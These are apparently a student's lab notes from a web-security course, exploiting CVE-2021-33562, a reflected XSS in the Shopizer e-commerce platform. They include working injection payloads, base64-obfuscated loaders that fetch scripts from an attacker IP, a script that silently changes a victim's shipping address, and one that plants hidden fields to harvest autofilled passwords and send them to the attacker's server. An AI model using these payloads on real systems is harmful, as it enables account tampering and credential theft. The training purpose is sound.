This Learning Unit covers the following Learning Objectives:

1. Discover an XSS vulnerability in Shopizer
2. Create advanced payloads to load external JavaScript resources
3. Discover application-specific attack vectors
4. Exploit a Shopizer user using application-specific attacks

Let's analyze a reflected server-side cross-site scripting vulnerability that was found in `Shopizer`, an open source e-commerce platform written in `Java`. The vulnerability we'll review is documented as `CVE-2021-33562`.

The XSS vulnerability occurs in an unauthenticated section of the application. However, we will eventually target functionality that requires an authenticated user. We'll create our own account to test the application and play the role of the victim.

|Username|Password|URL|
|---|---|---|
|N/A|N/A|http://shopizer:8080/shop/|
|admin@shopizer.com|password|http://shopizer:8080/admin/|

> Table 1 - Credentials for Shopizer

We will attempt to discover the vulnerability for ourselves and then craft a payload that can target other users of the application. Before continuing, let's start Burp Suite, turn off Intercept if it is enabled, and open the embedded browser by clicking the `Open Browser` button within the proxy tab.

Let's start out by creating an account. We'll browse to the shop page at `http://shopizer:8080/shop`.

Shopizer takes a couple minutes to start and populate the database. Once started, this version might not load the css properly on some requests. This usually does not affect the functionality of the site or the exploit; however, if this does happen, a refresh of the page usually fixes it.

We can start the registration flow by clicking on `My Account > Register`.

-----------
#### 6.2.2 Discovering the Vulnerability
Let's start exploring the application from the home page. We'll click on `Products > Handbags`. Once the page loads, we will notice something interesting about the URL.

![[Pasted image 20241219135104.png]]

The `"ref=c:2"` part seems strange. It's sort of like a [query string parameter](https://en.wikipedia.org/wiki/Query_string), but there's no question mark indicating the start of the query string.

Let's determine if the "ref" value is treated like a parameter. We'll inspect the HTML the page source in our browser by right-clicking and selecting `View page source`. Once the new tab opens, let's open the browser's Find tool by pressing `C+f` and then entering `c:2`.

![[Pasted image 20241219135250.png]]

Stepping through the results, we find that it's used in several link URLs. More importantly, an inline JavaScript function that starts on line `721` uses the value.

```javascript
721  function loadCategoryProducts() {
722    var url = '/services/public/products/page/' + START_COUNT_PRODUCTS + '/' + MAX_PRODUCTS + '/DEFAULT/en/handbags';
723  	 	
724    if(filter!=null) {
725      url = url + '/filter=' + filter + '/filter-value=' + filterValue +'';
726    }
727  
728  
729    url = url + '?ref=c:2';
730  
731  
732    loadProducts(url,'#productsContainer');
733  
734  }
```

Line `729` contains the full `ref=c:2` value. If we modify this value in the URL and the application writes the value into the JavaScript code, we might be able to inject our own JavaScript.

Let's try using a `canary` and check if the application writes it in the JavaScript function. Any value will work, but we'll pick one that is unlikely to occur in the application so we have fewer results to search through. In this case, we'll place the literal string "canary" after "c:2" so that our URL ends with "ref=c:2canary".

***A "canary" can be any value. Choosing a value that isn't used by the application can make it easier to find instances of the value in our search.***

Let's load that page and then check the page source. Interestingly, when we search for `canary`, we only get three results. The `loadCategoryProducts()`, starting on line 721, includes one of the results.

![[Pasted image 20241219141240.png]]

It seems we have some ability to inject content into the JavaScript code, albeit as a string value. Our next step is to try injecting a single quote to `escape` out of the string and determine if we can inject into the code itself. Let's place a single quote before "canary", refresh the page, and check the source.

![[Pasted image 20241219141400.png]]

The application wrote our canary in the JavaScript code, but we've broken the page. Our payload left the line of JavaScript with an extraneous single quote. Additionally, `canary` by itself isn't valid JavaScript syntax. If we check the JavaScript console in the browser`(C+B+k)`, we'll find the following error:

```javascript
Uncaught SyntaxError: Unexpected identifier       ref=c:2'c```javascriptanary:729
```

Let's update our payload to contain valid JavaScript after the single quote. We'll try an alert window. We'll close out the string, followed by a semicolon to complete the statement. We can place our `alert(1);'` last, resulting in the payload `c:2';alert(1);'canary`. Let's submit this value. If it works, we should get an alert box after the page loads.

![[Pasted image 20241219141920.png]]
Unfortunately, that didn't work. Some application servers and firewalls will block a semicolon in a URL. Without access to the log files for the application or the server, we don't know where the issue occurred. We'll need to find another way to make our payload result in valid JavaScript. Let's try using `plus` signs instead of semicolons.

![[Pasted image 20241219142011.png]]
Excellent! An alert box isn't very impressive, but we have confirmed we can inject arbitrary JavaScript code and the application will return it to our browser. In the next section, we'll craft a payload to load an external script from our Kali machine. This will let us deliver a more complicated payload to exploit this vulnerability and target other users of the application.

Before continuing to the next section, follow the steps above to recreate the alert window payload.
##### 6.2.2 Labs
`OS{OtherPeoplesMoney}`
![[Pasted image 20241219134508.png]]
payload `c:2'+alert(1)+'canary`
![[Pasted image 20241219134405.png]]

--------

#### 6.2.3 Loading Remote Scripts

In the previous section, we were able to exploit a reflected cross-site scripting vulnerability by displaying an alert box using an inline payload in the URL. While this worked for that payload, our payload will grow in size if we want to perform more complicated actions.

Let's try to use the XSS vulnerability to inject a link to an external JavaScript file. Such an external file wouldn't have the same size restrictions as a payload delivered in the URL.

We have a few ways we can try to inject a script. We could "close out" the existing script block and try to inject a new _script_ tag. Since we're injecting our JavaScript payload through the URL in this application, we might run into issues with restricted characters if we try to include a script tag.

Fortunately, there are other ways to load additional JavaScript files into an application. Let's inspect the Shopizer application and determine what JavaScript libraries it uses. If the application loads JavaScript libraries, we might be able to use some existing functions to make a smaller payload. We can use the [_Site map_](https://portswigger.net/burp/documentation/desktop/tools/target/site-map) tool in Burp Suite to find this information.

Let's access the Site map tool by clicking on `Target` > `Site map`.
![[Pasted image 20241223154023.png]]
We can find the JavaScript files Shopizer uses by clicking on `http://shopizer:8080`> `resources` > `js`.

![[Pasted image 20241223154252.png]]
The Shopizer application loads several jQuery files. The [jQuery library](https://en.wikipedia.org/wiki/JQuery) makes DOM manipulation easier in JavaScript with helper functions. One of the helper functions we're interested in is the [_jQuery.getScript()_](https://api.jquery.com/jquery.getscript/) function to load and execute a remote JavaScript file.

While we can do this in "vanilla" JavaScript, using jQuery will save us a decent amount of space and simplify the payload.

As a reminder, our previous payload injected JavaScript as part of the "ref" value in the URL. We'll create a new payload using the `jQuery.getScript()` function to load a JavaScript file from our Kali machine.

First, let's create the JavaScript file to be hosted. We'll create this file in ~/xss. We'll also start python's HTTP server to serve the file on port 80.

creating a simple `JS` file
```bash
kali@kali:~$ mkdir ~/xss/

kali@kali:~$ cd ~/xss/

kali@kali:~/xss$ nano xss.js

kali@kali:~/xss$ cat xss.js
alert('It worked!')

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next, let's craft the XSS payload that will load this file. We need to pass the `jQuery.getScript()` function a URL. We've already discovered that a semicolon causes issues with the payload, and ideally, we want to use the least amount of special characters as possible.

We want to encode the whole payload in such a way that it is meaningless while the application server is processing the URL. The ideal encoding scheme would output alphanumeric characters that wouldn't impact the URL (e.g. no forward slashes). Considering these factors, we'll [_Base64-encode_](https://developer.mozilla.org/en-US/docs/Glossary/Base64) the core of the payload and then include the [_atob()_](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/atob) function to decode it.

We can use the Decoder tool in Burp Suite to Base64-encode our `fetch()` call. Let's click on the `Decoder` tab and paste our payload in the text box. Since we will be Base64-encoding for this part of the payload, we'll click we'll click `Encode` as ..._ > `Base64`.

payload
- had to make sure `jQuery` was spelt like that
```js
jQuery.getScript('http://192.168.45.233/xsscinco.js')

```
base64
```js
alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc2NpbmNvLmpzJykK
```
![[Pasted image 20241223155127.png]]

Now that we have our payload Base64-encoded, we need to wrap it in two function calls. First, we'll pass it to `atob()` to decode the value. This will return a string of our payload. We'll pass the string in to `eval()` to execute the string as JavaScript.

As we found when we were displaying an alert, we'll also need to surround our payload in plus signs and quotes. Our final payload, including single quotes and plus signs, is listed below.

```js
'+eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc2NpbmNvLmpzJykK'))+'
```

Let's submit this payload to the application. We will most likely receive an error. If the error isn't the first message displayed, it might be the second after our alert is dismissed.

mine got this error as well
![[Pasted image 20241223155605.png]]
This error message causes a problem. Sometimes our payload is executed first, but other times the error is displayed first. When an alert is displayed, execution is paused and our payload might not be executed until the user dismisses it. Let's investigate the JavaScript console to determine what might have gone wrong.
![[Pasted image 20241223155751.png]]
Here, we'll find the server informing us of an "Invalid character found in the request target". This is most likely because of the value returned by the `getScript()` function. We can fix this by Base64-encoding the entire response using the `btoa()` function. We'll have to wrap the entire `eval()` in this function.

```js
'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc2NpbmNvLmpzJykK')))+'
```

![[Pasted image 20241223160900.png]]

Excellent! It seems our external JavaScript file was loaded. Let's click _OK_ to close the dialog window.

While this proof of concept included a simple script, the important concept is that we injected an external JavaScript file. Now that we've done that, let's work on a more complicated payload.

Before continuing to the next section, follow the steps above and use the XSS vulnerability to load an external JavaScript file.

-------

#### 6.2.4. Exploiting Reflected XSS

Let's assess what we know about the application and what we might be able to do with cross-site scripting. The application uses a JSESSIONID cookie to track user sessions, but the cookie has the `HttpOnly` attribute set. Because the browser will block JavaScript from accessing the `JSESSIONID` cookie, we won't be able to steal another user's cookie with XSS.

That being said, the browser will allow JavaScript to send requests that include the cookie as long as the cookie is scoped to the requested domain. Perhaps we can inject JavaScript code that will target functionality within the application.

Let's explore the application as an authenticated user so we can familiarize ourselves with the functionality that is available. Let's sign in using the previously-created victim account and click on `Welcome` > `My Account`.

made an account with `test:test`
![[Pasted image 20241223173427.png]]
There aren't a lot of options here. The "change password" functionality requires the user's current password so we wouldn't be able to change a victim's password. However, we may be able to change their shipping address.

Let's click on `Billing & shipping information` and then click on `Add a new address`.

![[Pasted image 20241223173513.png]]
Let's fill out the form with some placeholder values and submit it by clicking the _CHANGE ADDRESS_ button so we have a sample request.

```bash
POST /shop/customer/updateAddress.html HTTP/1.1
Host: shopizer:8080
Content-Length: 181
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://shopizer:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://shopizer:8080/shop/customer/editAddress.html?customerId=200&billingAddress=true
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=83F2660894517D88AD0C382551CDE39A; user=DEFAULT_test@test.local
Connection: keep-alive


customerId=200&billingAddress=true&firstName=test&lastName=test&company=&address=test&city=test&country=AL&stateProvince=test&postalCode=test&phone=test&submitAddress=Change+
```
![[Pasted image 20241223173807.png]]
We should be able to send a POST request like this using `Fetch()` or `XMLHttpRequest()`. However, there is a catch. The POST includes a `customerId` parameter, which we might need to extract from the victim user. Before we investigate how to do that, let's first use Repeater to send this POST with the `customerId` value empty and review the response. We'll also replace the first name value with a new value so we can verify if the update worked.

![[Pasted image 20241223173901.png]]

Excellent. We received an HTTP 200 response that includes the updated first name value. We won't have to worry about knowing the `customerId` value after all.
Our next step is to craft a JavaScript payload to send a similar request. We'll use the `fetch()` function to send the request and pass it the URL and an object containing the various configurations necessary for the request.

original
```javascript
01  fetch('http://shopizer:8080/shop/customer/updateAddress.html',{
02    method: 'POST',
03    mode: 'same-origin',
04    credentials: 'same-origin',
05    headers: {
06      'Content-Type':'application/x-www-form-urlencoded'
07    }, 
08    body:'customerId=&billingAddress=false&firstName=hax&lastName=hax&company=&address=hax&city=hax&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change address'
09  })
```
without numbers `xsscinco2.js`
```js
fetch('http://shopizer:8080/shop/customer/updateAddress.html', {
  method: 'POST',
  mode: 'same-origin',
  credentials: 'same-origin',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  }, 
  body: 'customerId=&billingAddress=false&firstName=hax&lastName=hax&company=&address=hax&city=hax&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change address'
});
```

We'll start the options object by setting the `method` to "POST" (line 2). Since our payload will effectively be hosted on the same domain as the application, we'll set the `mode` and `credentials` values to "same-origin" on lines 3 and 4. This should allow the browser to send the JSESSIONID cookie since the request will not be cross-origin. We'll include a `Content-Type` header with the value of "application/x-www-form-urlencoded" (lines 5-7). Finally, we'll include the POST body contents with some proof of concept values.

Now that we have our payload, we'll save it to the xss.js file we created earlier and start the HTTP server.

```bash
┌──(root💀gobots)-[23Dec2024 22:43:29]-[/home/kali/SUT/OSWA/xss]
└─# vim xsscinco2.js

kali@kali:~$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's test this payload out on our own account. Let's first browse to `http://shopizer:8080/shop/customer/dashboard.html` to make sure our session is still valid. If it's not, we'll need to log in again.

Next, let's visit the "Handbags" section and load our exploit URL, which will load the malicious JavaScript file from our Kali machine. The payload again will be `'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc2NpbmNvMi5qcycpCg==')))+'`

![[Pasted image 20241223174619.png]]

![[Pasted image 20241223174632.png]]

The web page does not include any indication of whether our payload worked. If we check the HTTP history tab in Burp Suite, we should find that our POST request was sent.

We can verify the changes were saved by returning to the "My Account" page and clicking `Billing & shipping information`.

![[Pasted image 20241223174900.png]]
new payload workedExcellent! We were able to modify our user's shipping address with the reflected XSS vulnerability.

Next, let's target a `simulated user` using the XSS sandbox to mimic a real-world attack. We'll start by visiting the Shopizer page on the XSS sandbox at `http://xss-sandbox/challenge/shopizer`.

Once this page is loaded, we'll navigate to the "Handbags" page and add our payload.

NOTE: The XSS sandbox automatically adds the `/shop/` prefix when visiting the Shopizer app. If we create the payload by visiting the page, we don't need to worry about this. However, if we are pasting the URL, we need to ensure we remove the **/shop/** portion of it.

takes some time to bootup `http://192.168.210.101/challenge/shopizer`
![[Pasted image 20241223175352.png]]
use the same payload as before 
```js
'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc2NpbmNvMi5qcycpCg==')))+'
```
at the `handbags` ref
![[Pasted image 20241223175529.png]]
got a hit on my python server
![[Pasted image 20241223175554.png]]

Next, let's check `"Use HttpOnly Cookie"` to have the simulator start the session before the page is loaded and click `Render`.
![[Pasted image 20241223175705.png]]
rendering and hit python server
![[Pasted image 20241223175724.png]]

The victim loaded the page, but we have no way of knowing if the payload worked. We're pretty confident that the payload changed the address since we can find another log in the HTTP server. However, we can also cheat and have the victim load the billing page to verify. To do this, we'll log in to our account in the hacker browser and visit the billing page. Once here, we can click _Render_ and the victim will load the same page. However, we can examine what the victim's browser rendered and verify the address is changed.

how we know it worked, amanda has `hax`
![[Pasted image 20241223175935.png]]

##### Labs
`ALERT!howDidYouGetThis?`
![[Pasted image 20241223183959.png]]
used `burpsuite` decoder with 
```js
jQuery.getScript('http://192.168.45.233/xsssavedpasswords.js')
```
to get a `base64` encoded version
```js
alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc3NhdmVkcGFzc3dvcmRzLmpzJykK
```
- **Decode the Value**:
    - The payload string is passed into the `atob()` function.
    - This decodes the Base64-encoded input, returning a readable string.
- **Evaluate as JavaScript**:
    - The decoded string is then passed into the `eval()` function.
    - This executes the string as JavaScript code.
- **Re-encode the Response**:
    - The result of the executed JavaScript is Base64-encoded using the `btoa()` function.
    - This ensures the response is returned in an encoded format.
```bash
'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc3NhdmVkcGFzc3dvcmRzLmpzJykK')))+'
```
utilize this `XSS` payload to dump saved passwords
```bash
┌──(root💀gobots)-[24Dec2024 00:28:11]-[/home/kali/SUT/OSWA/xss]
└─# cat xsssavedpasswords.js 
let body = document.getElementsByTagName("body")[0];

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";

var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
//p.style.opacity = "0";

body.append(u)
body.append(p)

setTimeout(function(){ 
    fetch("http://192.168.45.233:80/k?u=" + u.value + "&p=" + p.value)
}, 5000);

```
open `python3 http server`
![[Pasted image 20241223192908.png]]
submit the payload `'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc3NhdmVkcGFzc3dvcmRzLmpzJykK')))+'` in the handbag section, and it will pull over and execute the `xsssavedpasswords.js` and pull the saved passwords back to kali. 

make sure to render on the victim side

![[Pasted image 20241223192802.png]]
profit and get password
![[Pasted image 20241223193213.png]]